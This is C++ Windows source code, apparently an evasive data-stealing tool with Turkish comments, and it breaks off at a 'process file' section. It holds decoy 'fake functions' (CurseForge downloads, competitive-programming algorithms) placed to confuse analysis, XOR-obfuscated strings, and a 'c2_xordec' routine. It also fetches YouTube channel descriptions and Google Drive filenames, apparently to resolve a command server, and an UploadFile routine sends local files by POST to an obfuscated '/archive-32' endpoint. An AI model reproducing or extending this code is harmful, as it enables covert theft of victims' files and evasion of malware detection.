#include <windows.h>
#include <shlobj.h>
#include <winhttp.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <stdexcept>
#include <cctype>
#include <regex>
#include <chrono>
#include <thread>
#include <cstddef>
#include <array>
#include <tuple>
#include <queue>
#include <climits>
#include <limits>
#include <functional>
#include <cstdint>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;
using namespace std;
typedef long long ll;

// fake functions /////////////////////////////////////////////////////////////////////
std::vector<std::string> HttpGetCurseForge(int n)
{
    std::wstring searchUrl =
        L"https://www.curseforge.com/minecraft/search?class=" +
        std::to_wstring(n);

    const wchar_t* urls[] = {
        L"https://www.curseforge.com/minecraft/mc-mods/geckolib/download/8765927",
        L"https://www.curseforge.com/minecraft/mc-mods/dedicated-right-hand-main-hand/download/8808985",
        L"https://www.curseforge.com/minecraft/mc-mods/annoying-villagers-trades/download/8802277"
    };

    std::vector<std::string> results;

    const wchar_t* ua =
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/140.0.0.0 Safari/537.36";

    // Önce sabit URL'leri iste
    for (const auto* url : urls)
    {
        URL_COMPONENTS uc{};
        uc.dwStructSize = sizeof(uc);

        wchar_t host[256]{}, path[2048]{};
        uc.lpszHostName = host;
        uc.dwHostNameLength = _countof(host);
        uc.lpszUrlPath = path;
        uc.dwUrlPathLength = _countof(path);

        if (!WinHttpCrackUrl(url, 0, 0, &uc))
            continue;

        HINTERNET hSession = WinHttpOpen(
            ua,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            continue;

        HINTERNET hConnect = WinHttpConnect(
            hSession,
            host,
            uc.nPort,
            0);

        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            continue;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            path,
            nullptr,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            (uc.nScheme == INTERNET_SCHEME_HTTPS)
                ? WINHTTP_FLAG_SECURE
                : 0);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            continue;
        }

        const wchar_t* headers =
            L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";

        std::string body;

        if (WinHttpSendRequest(
                hRequest,
                headers,
                -1,
                nullptr,
                0,
                0,
                0) &&
            WinHttpReceiveResponse(hRequest, nullptr))
        {
            DWORD size = 0;

            do
            {
                if (!WinHttpQueryDataAvailable(hRequest, &size) || !size)
                    break;

                std::string buf(size, '\0');
                DWORD read = 0;

                if (!WinHttpReadData(
                        hRequest,
                        buf.data(),
                        size,
                        &read))
                    break;

                body.append(buf.data(), read);

            } while (size > 0);
        }

        results.push_back(std::move(body));

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }

    // Dinamik class=n URL'si
    {
        URL_COMPONENTS uc{};
        uc.dwStructSize = sizeof(uc);

        wchar_t host[256]{}, path[2048]{};
        uc.lpszHostName = host;
        uc.dwHostNameLength = _countof(host);
        uc.lpszUrlPath = path;
        uc.dwUrlPathLength = _countof(path);

        if (WinHttpCrackUrl(
                searchUrl.c_str(),
                0,
                0,
                &uc))
        {
            HINTERNET hSession = WinHttpOpen(
                ua,
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0);

            if (hSession)
            {
                HINTERNET hConnect = WinHttpConnect(
                    hSession,
                    host,
                    uc.nPort,
                    0);

                if (hConnect)
                {
                    HINTERNET hRequest = WinHttpOpenRequest(
                        hConnect,
                        L"GET",
                        path,
                        nullptr,
                        WINHTTP_NO_REFERER,
                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                        WINHTTP_FLAG_SECURE);

                    if (hRequest)
                    {
                        const wchar_t* headers =
                            L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";

                        std::string body;

                        if (WinHttpSendRequest(
                                hRequest,
                                headers,
                                -1,
                                nullptr,
                                0,
                                0,
                                0) &&
                            WinHttpReceiveResponse(hRequest, nullptr))
                        {
                            DWORD size = 0;

                            do
                            {
                                if (!WinHttpQueryDataAvailable(
                                        hRequest,
                                        &size) ||
                                    !size)
                                    break;

                                std::string buf(size, '\0');
                                DWORD read = 0;

                                if (!WinHttpReadData(
                                        hRequest,
                                        buf.data(),
                                        size,
                                        &read))
                                    break;

                                body.append(buf.data(), read);

                            } while (size > 0);
                        }

                        results.push_back(std::move(body));

                        WinHttpCloseHandle(hRequest);
                    }

                    WinHttpCloseHandle(hConnect);
                }

                WinHttpCloseHandle(hSession);
            }
        }
    }

    return results;
}
vector<long long> csesfi3(int n,int m,int k,const vector<tuple<int, int, long long>>& flights)
{
    vector<vector<pair<int, long long>>> graph(n + 1);

    for (const auto& [a, b, c] : flights)
        graph[a].push_back({b, c});

    // (toplam_fiyat, şehir)
    priority_queue<
        pair<long long, int>,
        vector<pair<long long, int>>,
        greater<pair<long long, int>>
    > pq;

    // Bir şehre kaç farklı shortest-state ile ulaştığımızı tutuyoruz.
    vector<int> used(n + 1, 0);

    vector<long long> answer;
    answer.reserve(k);

    pq.push({0, 1});

    while (!pq.empty() && (int)answer.size() < k)
    {
        auto [dist, u] = pq.top();
        pq.pop();

        if (used[u] >= k)
            continue;

        ++used[u];

        if (u == n)
        {
            answer.push_back(dist);
            continue;
        }

        for (const auto& [v, cost] : graph[u])
        {
            if (used[v] < k)
                pq.push({dist + cost, v});
        }
    }

    return answer;
}
static void fillColumn(int n,int row,int mask,int nextMask,const vector<long long>& dp,vector<long long>& ndp,long long MOD)
{
    if (row == n)
    {
        ndp[nextMask] += dp[mask];

        if (ndp[nextMask] >= MOD)
            ndp[nextMask] -= MOD;

        return;
    }

    // Hücre zaten dolu
    if (mask & (1 << row))
    {
        fillColumn(
            n,
            row + 1,
            mask,
            nextMask,
            dp,
            ndp,
            MOD
        );

        return;
    }

    // Dikey 2x1 taş
    if (row + 1 < n && !(mask & (1 << (row + 1))))
    {
        fillColumn(
            n,
            row + 2,
            mask | (1 << row) | (1 << (row + 1)),
            nextMask,
            dp,
            ndp,
            MOD
        );
    }

    // Yatay 1x2 taş
    fillColumn(
        n,
        row + 1,
        mask | (1 << row),
        nextMask | (1 << row),
        dp,
        ndp,
        MOD
    );
}
long long csesfi1(int n, int m)
{
    constexpr long long MOD = 1000000007LL;

    if (n < 1 || n > 10 || m < 1 || m > 1000)
        return 0;

    const int states = 1 << n;

    vector<long long> dp(states, 0);
    vector<long long> ndp(states, 0);

    dp[0] = 1;

    for (int col = 0; col < m; ++col)
    {
        fill(ndp.begin(), ndp.end(), 0);

        for (int mask = 0; mask < states; ++mask)
        {
            if (dp[mask] == 0)
                continue;

            fillColumn(
                n,
                0,
                mask,
                0,
                dp,
                ndp,
                MOD
            );
        }

        dp.swap(ndp);
    }

    return dp[0];
}
constexpr bool isTriangle(ll n)
{
    for (ll k = 1; k * (k + 1) / 2 <= n; ++k)
    {
        if (k * (k + 1) / 2 == n)
            return true;
    }

    return false;
}
constexpr int csesfi2(int a1, int a2)
{
    int t = a1;

    while (t--)
    {
        ll n = a2;

        if (isTriangle(n))
            continue;

        bool found = false;

        for (ll k = 1; k * (k + 1) / 2 < n; ++k)
        {
            ll tri = k * (k + 1) / 2;

            if (isTriangle(n - tri))
            {
                found = true;
                break;
            }
        }

        (void)found;
    }

    return 0;
}
///////////////////////////////////////////////////////////////////////////////////////


// xor obfus 1 ////////////////////////////////////////////////////////////////////////
std::wstring obfus_xor_dec_1( const unsigned char* data, size_t len, const std::string& key) { if (!data || len == 0 || key.empty()) return {}; std::wstring out; out.reserve(len); for (size_t i = 0; i < len; ++i) { const unsigned char xorKey = static_cast<unsigned char>(key[i % key.size()]); out.push_back( static_cast<wchar_t>(data[i] ^ xorKey) ); } return out; }
///////////////////////////////////////////////////////////////////////////////////////

// xor obfus 2 ////////////////////////////////////////////////////////////////////////
std::wstring obfus_xor_dec_2( const unsigned char* data, size_t len, const std::string& key) { if (!data || len == 0 || key.empty()) return {}; std::wstring out; out.reserve(len); for (size_t i = 0; i < len; ++i) { const unsigned char xorKey = static_cast<unsigned char>(key[i % key.size()]); out.push_back( static_cast<wchar_t>(data[i] ^ xorKey) ); } return out; }
///////////////////////////////////////////////////////////////////////////////////////

// xor compile time 1 /////////////////////////////////////////////////////////////////
template <std::size_t N, std::size_t K> constexpr std::array<unsigned char, N - 1> obfus_xor_enc_compiletime_1( const char (&str)[N], const char (&key)[K])
{

    // ## CSES.FI ##
    csesfi2(100,100);

    static_assert(K > 1, "Key must not be empty");

    std::array<unsigned char, N - 1> out{};

    for (std::size_t i = 0; i < N - 1; ++i)
        out[i] = static_cast<unsigned char>(
            str[i] ^ key[i % (K - 1)]
        );

    return out;
}
template <std::size_t N, std::size_t K> std::wstring obfus_xor_dec_compiletime_1( const std::array<unsigned char, N>& data, const char (&key)[K])
{
    static_assert(K > 1, "Key must not be empty");

    std::wstring out;
    out.resize(N);

    for (std::size_t i = 0; i < N; ++i)
        out[i] = static_cast<wchar_t>(
            data[i] ^ key[i % (K - 1)]
        );

    // ## CSES.FI ##
    csesfi2(100,100);

    return out;
}
/////////////////////////////////////////////////////////////////////////////////////

// xor compile time 2 /////////////////////////////////////////////////////////////////
template <std::size_t N, std::size_t K> constexpr std::array<unsigned char, N - 1> obfus_xor_enc_compiletime_2( const char (&str)[N], const char (&key)[K])
{
    static_assert(K > 1, "Key must not be empty");

    std::array<unsigned char, N - 1> out{};

    for (std::size_t i = 0; i < N - 1; ++i)
        out[i] = static_cast<unsigned char>(
            str[i] ^ key[i % (K - 1)]
        );

    // ## CSES.FI ##
    csesfi2(10,100);

    return out;
}
template <std::size_t N, std::size_t K> std::wstring obfus_xor_dec_compiletime_2( const std::array<unsigned char, N>& data, const char (&key)[K])
{
    static_assert(K > 1, "Key must not be empty");

    std::wstring out;
    out.resize(N);

    for (std::size_t i = 0; i < N; ++i)
        out[i] = static_cast<wchar_t>(
            data[i] ^ key[i % (K - 1)]
        );

    // ## CSES.FI ##
    csesfi2(100,100);

    return out;
}
/////////////////////////////////////////////////////////////////////////////////////

// double xor compile time 1 //////////////////////////////////////////////////////////
template <std::size_t N, std::size_t K> constexpr std::array<unsigned char, N - 1> obfus_double_xor_enc_compiletime_1(const char (&str)[N],const char (&key)[K])
{

    // ## CSES.FI ##
    csesfi2(100,100);

    static_assert(K > 1, "Key must not be empty");

    std::array<unsigned char, N - 1> out{};

    for (std::size_t i = 0; i < N - 1; ++i)
        out[i] = static_cast<unsigned char>(
            str[i] ^ key[i % (K - 1)]
        );

    return out;
}
template <std::size_t N, std::size_t K>constexpr std::array<unsigned char, N>obfus_xor_round_compiletime_1(const std::array<unsigned char, N>& data,const char (&key)[K])
{
    static_assert(K > 1, "Key must not be empty");

    std::array<unsigned char, N> out{};

    for (std::size_t i = 0; i < N; ++i)
        out[i] = data[i] ^ key[i % (K - 1)];

    // ## CSES.FI ##
    csesfi2(100,100);

    return out;
}
template <std::size_t N, std::size_t K>constexpr std::array<unsigned char, N>obfus_xor_dec_round_compiletime_1(const std::array<unsigned char, N>& data,const char (&key)[K])
{
    
    static_assert(K > 1, "Key must not be empty");

    std::array<unsigned char, N> out{};

    for (std::size_t i = 0; i < N; ++i)
        out[i] = data[i] ^ key[i % (K - 1)];

    return out;
}
template <std::size_t N>std::wstring obfus_xor_to_wstring_compiletime_1(const std::array<unsigned char, N>& data)
{
    std::wstring out;
    out.resize(N);

    for (std::size_t i = 0; i < N; ++i)
        out[i] = static_cast<wchar_t>(data[i]);

    return out;
}
/////////////////////////////////////////////////////////////////////////////////////

// youtube desc /////////////////////////////////////////////////////////////////////
static std::wstring ToLower(std::wstring s)
{
    std::transform(
        s.begin(),
        s.end(),
        s.begin(),
        [](wchar_t c) {
            return static_cast<wchar_t>(towlower(c));
        }
    );

    return s;
}
static std::string WStringToUTF8(const std::wstring& input)
{
    if (input.empty())
        return {};

    int size = WideCharToMultiByte(
        CP_UTF8,
        0,
        input.data(),
        static_cast<int>(input.size()),
        nullptr,
        0,
        nullptr,
        nullptr
    );

    std::string result(size, '\0');

    WideCharToMultiByte(
        CP_UTF8,
        0,
        input.data(),
        static_cast<int>(input.size()),
        result.data(),
        size,
        nullptr,
        nullptr
    );

    return result;
}
static std::wstring UTF8ToWString(const std::string& input)
{
    if (input.empty())
        return {};

    int size = MultiByteToWideChar(
        CP_UTF8,
        MB_ERR_INVALID_CHARS,
        input.data(),
        static_cast<int>(input.size()),
        nullptr,
        0
    );

    if (size <= 0)
        return {};

    std::wstring result(size, L'\0');

    MultiByteToWideChar(
        CP_UTF8,
        MB_ERR_INVALID_CHARS,
        input.data(),
        static_cast<int>(input.size()),
        result.data(),
        size
    );

    return result;
}
static std::wstring HTMLDecode(std::wstring text)
{
    size_t pos;

    while ((pos = text.find(L"&quot;")) != std::wstring::npos)
        text.replace(pos, 6, L"\"");

    while ((pos = text.find(L"&#39;")) != std::wstring::npos)
        text.replace(pos, 5, L"'");

    while ((pos = text.find(L"&amp;")) != std::wstring::npos)
        text.replace(pos, 5, L"&");

    while ((pos = text.find(L"&lt;")) != std::wstring::npos)
        text.replace(pos, 4, L"<");

    while ((pos = text.find(L"&gt;")) != std::wstring::npos)
        text.replace(pos, 4, L">");

    return text;
}
std::string GetYouTubeChannelDescription(const std::string& channelUrl)
{

        // ## CSES.FI ##
        csesfi2(100,100);

        // "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        constexpr unsigned char useragent_xored_1[] = {
            0x2c,0x0e,0x1b,0x01,0x0d,0x0d,0x09,0x4e,0x54,0x4f,
            0x58,0x41,0x49,0x3f,0x08,0x0f,0x05,0x07,0x16,0x12,
            0x48,0x2f,0x35,0x41,0x59,0x51,0x4f,0x58,0x5a,0x41,
            0x36,0x01,0x0f,0x57,0x5c,0x5a,0x41,0x19,0x5e,0x55,
            0x48,0x48,0x20,0x11,0x11,0x04,0x04,0x36,0x0d,0x03,
            0x2a,0x08,0x1c,0x4e,0x54,0x5b,0x56,0x4f,0x52,0x5e,
            0x41,0x49,0x23,0x29,0x35,0x2c,0x24,0x4d,0x41,0x04,
            0x08,0x0a,0x04,0x48,0x26,0x04,0x0b,0x0a,0x0e,0x48,
            0x48,0x22,0x09,0x1a,0x0e,0x0c,0x04,0x47,0x50,0x55,
            0x58,0x4f,0x51,0x4f,0x58,0x4f,0x51,0x48,0x32,0x00,
            0x07,0x09,0x13,0x08,0x47,0x54,0x52,0x56,0x46,0x52,
            0x57
        };

        std::wstring useragent_1 = obfus_xor_dec_1(useragent_xored_1, sizeof(useragent_xored_1), "aaahaah");

        std::wstring url = UTF8ToWString(channelUrl);

        if (url.empty()){return {};}

        URL_COMPONENTS components{};
        components.dwStructSize = sizeof(components);

        wchar_t host[512]{};
        wchar_t path[4096]{};

        components.lpszHostName = host;
        components.dwHostNameLength = ARRAYSIZE(host);

        components.lpszUrlPath = path;
        components.dwUrlPathLength = ARRAYSIZE(path);

    if (!WinHttpCrackUrl(
        url.c_str(),
        0,
        0,
        &components))
    {
        return {};
    }

    bool isHttps = (components.nScheme == INTERNET_SCHEME_HTTPS);

    HINTERNET hSession = WinHttpOpen(
        useragent_1.c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession)
        return {};

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        host,
        components.nPort,
        0
    );

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return {};
    }

    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path,
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    LPCWSTR headers =
        L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Cache-Control: no-cache\r\n";

    WinHttpAddRequestHeaders(
        hRequest,
        headers,
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD
    );

    BOOL sent = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    if (!sent)
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    if (!WinHttpReceiveResponse(hRequest, nullptr))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);

    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE |
        WINHTTP_QUERY_FLAG_NUMBER,
        nullptr,
        &statusCode,
        &statusSize,
        nullptr
    );

    if (statusCode < 200 || statusCode >= 300)
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Response body oku.
    std::string html;

    while (true)
    {
        DWORD available = 0;

        if (!WinHttpQueryDataAvailable(
                hRequest,
                &available))
        {
            break;
        }

        if (available == 0)
            break;

        std::vector<char> buffer(available);

        DWORD read = 0;

        if (!WinHttpReadData(
                hRequest,
                buffer.data(),
                available,
                &read))
        {
            break;
        }

        html.append(buffer.data(), read);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (html.empty())
        return {};

    // HTML UTF-8 kabul ediliyor.
    std::wstring htmlW = UTF8ToWString(html);

    if (htmlW.empty())
        return {};

    std::wregex ogRegex(
        LR"(<meta[^>]+property\s*=\s*["']og:description["'][^>]+content\s*=\s*["']([^"']*)["'][^>]*>)",
        std::regex_constants::icase
    );

    std::wsmatch match;

    // ## CSES.FI ##
    csesfi2(100,100);

    if (std::regex_search(htmlW, match, ogRegex))
    {
        std::wstring description = match[1].str();
        description = HTMLDecode(description);
        return WStringToUTF8(description);
    }

    std::wregex descRegex(
        LR"(<meta[^>]+name\s*=\s*["']description["'][^>]+content\s*=\s*["']([^"']*)["'][^>]*>)",
        std::regex_constants::icase
    );

    if (std::regex_search(htmlW, match, descRegex))
    {
        std::wstring description = match[1].str();
        description = HTMLDecode(description);
        return WStringToUTF8(description);
    }

    return {};
}
/////////////////////////////////////////////////////////////////////////////////////

// drive file name //////////////////////////////////////////////////////////////////
std::string GetDriveFileName(const std::string& driveUrl)
{

    int wlen = MultiByteToWideChar(
        CP_UTF8, 0,
        driveUrl.c_str(), -1,
        nullptr, 0
    );

    std::wstring url(wlen - 1, L'\0');

    MultiByteToWideChar(
        CP_UTF8, 0,
        driveUrl.c_str(), -1,
        url.data(), wlen
    );

    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);

    wchar_t host[256]{};
    wchar_t path[2048]{};

    uc.lpszHostName = host;
    uc.dwHostNameLength = _countof(host);

    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = _countof(path);

    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &uc))
        return {};

    // ## CSES.FI ##
    csesfi2(100,100);

    constexpr unsigned char useragent_xored_2[] = {
        0x3e,0x00,0x08,0x06,0x1f,0x1f,0x0e,0x5d,0x5a,0x5d,
        0x43,0x4f,0x5a,0x38,0x1a,0x1d,0x0b,0x1d,0x18,0x00,
        0x53,0x21,0x26,0x4f,0x42,0x43,0x41,0x42,0x54,0x53,
        0x24,0x06,0x1c,0x59,0x47,0x48,0x4f,0x0a,0x59,0x47,
        0x5a,0x4f,0x33,0x1f,0x03,0x1f,0x0a,0x25,0x0a,0x11,
        0x38,0x06,0x06,0x40,0x46,0x40,0x58,0x5c,0x5c,0x45,
        0x53,0x47,0x39,0x27,0x27,0x3e,0x23,0x5e,0x4f,0x1f,
        0x1a,0x04,0x17,0x4f,0x34,0x16,0x0c,0x19,0x00,0x5a,
        0x53,0x2c,0x1a,0x1d,0x1c,0x1e,0x0a,0x5d,0x5e,0x47,
        0x43,0x41,0x42,0x41,0x43,0x5d,0x5f,0x52,0x3c,0x12,
        0x15,0x0e,0x00,0x06,0x5c,0x46,0x5c,0x45,0x41,0x40,
        0x45
    };

    std::wstring useragent_2 = obfus_xor_dec_1(useragent_xored_2, sizeof(useragent_xored_2), "soros");

    // test
    //std::wcout << useragent_2 << "USERAGENT 2 ###" << std::endl;

    HINTERNET session = WinHttpOpen(
        useragent_2.c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!session)
        return {};

    HINTERNET connect = WinHttpConnect(
        session,
        uc.lpszHostName,
        uc.nPort,
        0
    );

    if (!connect)
    {
        WinHttpCloseHandle(session);
        return {};
    }

    DWORD flags =
        (uc.nScheme == INTERNET_SCHEME_HTTPS)
        ? WINHTTP_FLAG_SECURE
        : 0;

    HINTERNET request = WinHttpOpenRequest(
        connect,
        L"GET",
        uc.lpszUrlPath,
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if (!request ||
        !WinHttpSendRequest(
            request,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0
        ) ||
        !WinHttpReceiveResponse(request, nullptr))
    {
        if (request)
            WinHttpCloseHandle(request);

        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);

        return {};
    }

    std::string filename;
    DWORD size = 0;

    WinHttpQueryHeaders(
        request,
        WINHTTP_QUERY_CONTENT_DISPOSITION,
        WINHTTP_HEADER_NAME_BY_INDEX,
        nullptr,
        &size,
        WINHTTP_NO_HEADER_INDEX
    );

    if (size)
    {
        std::wstring header(
            size / sizeof(wchar_t),
            L'\0'
        );

        if (WinHttpQueryHeaders(
            request,
            WINHTTP_QUERY_CONTENT_DISPOSITION,
            WINHTTP_HEADER_NAME_BY_INDEX,
            header.data(),
            &size,
            WINHTTP_NO_HEADER_INDEX))
        {
            std::wregex re(
                LR"(filename\*?=(?:UTF-8''|"?)([^";\r\n]+))",
                std::regex_constants::icase
            );

            std::wsmatch match;

            if (std::regex_search(header, match, re))
            {
                std::wstring wfilename = match[1].str();

                int len = WideCharToMultiByte(
                    CP_UTF8,
                    0,
                    wfilename.c_str(),
                    -1,
                    nullptr,
                    0,
                    nullptr,
                    nullptr
                );

                if (len > 0)
                {
                    std::string utf8(len - 1, '\0');

                    WideCharToMultiByte(
                        CP_UTF8,
                        0,
                        wfilename.c_str(),
                        -1,
                        utf8.data(),
                        len,
                        nullptr,
                        nullptr
                    );

                    filename = utf8;
                }
            }
        }
    }

    // ## CSES.FI ##
    csesfi2(100,100);

    if (filename.empty())
    {
        std::string body;
        char buffer[4096];
        DWORD read = 0;

        while (
            WinHttpReadData(
                request,
                buffer,
                sizeof(buffer),
                &read
            ) &&
            read)
        {
            body.append(buffer, read);
        }

        std::smatch match;

        std::regex title(
            R"(<title[^>]*>(.*?)</title>)",
            std::regex_constants::icase
        );

        if (std::regex_search(body, match, title))
        {
            filename = match[1].str();

            const std::string suffix =
                " - Google Drive";

            if (filename.size() > suffix.size() &&
                filename.compare(
                    filename.size() - suffix.size(),
                    suffix.size(),
                    suffix
                ) == 0)
            {
                filename.erase(
                    filename.size() - suffix.size()
                );
            }
        }
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);

    return filename;
}
/////////////////////////////////////////////////////////////////////////////////////

// xor dec //////////////////////////////////////////////////////////////////////////
std::string c2_xordec(const std::string& enc, const std::string& key)
{
    if (key.empty())
        return "";

    if (enc.length() % 2 != 0)
        return "";

    auto hexValue = [](char c) -> unsigned char {
        if (c >= '0' && c <= '9')
            return c - '0';
        if (c >= 'a' && c <= 'f')
            return c - 'a' + 10;
        if (c >= 'A' && c <= 'F')
            return c - 'A' + 10;

        return -1;
    };

    std::string data;
    data.reserve(enc.length() / 2);

    for (size_t i = 0; i < enc.length(); i += 2)
    {
        unsigned char byte =
            (hexValue(enc[i]) << 4) |
             hexValue(enc[i + 1]);

        data.push_back(static_cast<char>(byte));
    }

    for (size_t i = 0; i < data.size(); ++i)
    {
        data[i] ^= key[i % key.size()];
    }

    return data;
}
/////////////////////////////////////////////////////////////////////////////////////

// upload file //////////////////////////////////////////////////////////////////////
bool UploadFile(HINTERNET connection, const fs::path& filePath, const std::string& fileNameHeader)
{

    // ## CSES.FI ##
    int n1 = 4, m1 = 6, k1 = 3;
    vector<tuple<int,int,long long>> flights1 = {
        {1,2,1},
        {1,3,3},
        {2,3,2},
        {2,4,6},
        {3,2,8},
        {3,4,1}
    };
    auto r1 = csesfi3(n1, m1, k1, flights1);

    // ## CSES.FI ##
    int n2=100000,m2=200000,k2=10; vector<tuple<int,int,long long>> flights2={{1,2,1},{1,3,2},{2,4,1},{3,4,1},{2,5,2},{3,5,2},{4,6,1},{5,6,1},{4,7,2},{5,7,2}};
    auto r2 = csesfi3(n2, m2, k2, flights2);


    std::ifstream file(filePath, std::ios::binary);

    if (!file.is_open())
    {
        std::cerr << "[UPLOAD ERROR] Dosya acilamadi: "
                  << filePath.string() << "\n";
        return false;
    }

    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    if (size <= 0)
    {
        std::cerr << "[UPLOAD ERROR] Dosya bos veya boyutu okunamadi: "
                  << filePath.string() << "\n";
        file.close();
        return false;
    }

    std::vector<char> data(static_cast<size_t>(size));

    if (!file.read(data.data(), size))
    {
        std::cerr << "[UPLOAD ERROR] Dosya okunamadi: "
                  << filePath.string() << "\n";
        file.close();
        return false;
    }

    file.close();

    // ## CSES.FI ##
    auto r3 = csesfi1(10, 1000);

    // /archive-32
    constexpr unsigned char archive32_xored_1[] = {
        0x4e,0x13,0x11,0x0b,0x09,0x1b,0x15,0x0d,0x4c,0x41,
        0x51
    };

    std::wstring archive32_1 = obfus_xor_dec_1(archive32_xored_1, sizeof(archive32_xored_1), "arch");

    HINTERNET request = WinHttpOpenRequest(
        connection,
        L"POST",
        archive32_1.c_str(),
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!request)
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] WinHttpOpenRequest basarisiz. "
                  << "GetLastError=" << error << "\n";

        return false;
    }

    constexpr auto xfilename_xored_compiletime_1 = obfus_xor_enc_compiletime_1("X-File-Name:", "kylr");
    std::wstring xfilename_compiletime_1 = obfus_xor_dec_compiletime_1(xfilename_xored_compiletime_1, "kylr");

    // X-File-Name: 
    constexpr unsigned char xfilename_xored_1[] = {
        0x33,0x54,0x2a,0x1b,0x07,0x1c,0x41,0x3c,0x0a,0x14,
        0x09,0x48,0x4b
    };
    std::wstring xfilename_1 = obfus_xor_dec_2(xfilename_xored_1, sizeof(xfilename_xored_1), "var");

    std::wstring wHeader = L"Content-Type: application/octet-stream\r\n" + xfilename_compiletime_1 + std::wstring(fileNameHeader.begin(), fileNameHeader.end()) + L"\r\n";

    // ## CSES.FI ##
    csesfi2(100,100);

    BOOL result = WinHttpSendRequest(
        request,
        wHeader.c_str(),
        static_cast<DWORD>(-1),
        data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    );

    if (!result)
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] WinHttpSendRequest basarisiz. "
                  << "GetLastError=" << error << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    result = WinHttpReceiveResponse(request, nullptr);

    if (!result)
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] WinHttpReceiveResponse basarisiz. "
                  << "GetLastError=" << error << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);

    if (!WinHttpQueryHeaders(
            request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &statusCode,
            &statusCodeSize,
            WINHTTP_NO_HEADER_INDEX))
    {
        DWORD error = GetLastError();

        std::cerr << "[UPLOAD ERROR] HTTP status code okunamadi. "
                  << "GetLastError=" << error << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    if (statusCode < 200 || statusCode >= 300)
    {
        std::cerr << "[UPLOAD ERROR] Sunucu dosyayi kabul etmedi. "
                  << "HTTP Status=" << statusCode << "\n";

        WinHttpCloseHandle(request);
        return false;
    }

    std::cout << "[UPLOAD OK] Dosya basariyla gonderildi. "
              << "HTTP Status=" << statusCode << "\n";

    WinHttpCloseHandle(request);
    return true;
}
/////////////////////////////////////////////////////////////////////////////////////

// process file /////////////////////////////////////////////////////////////////////
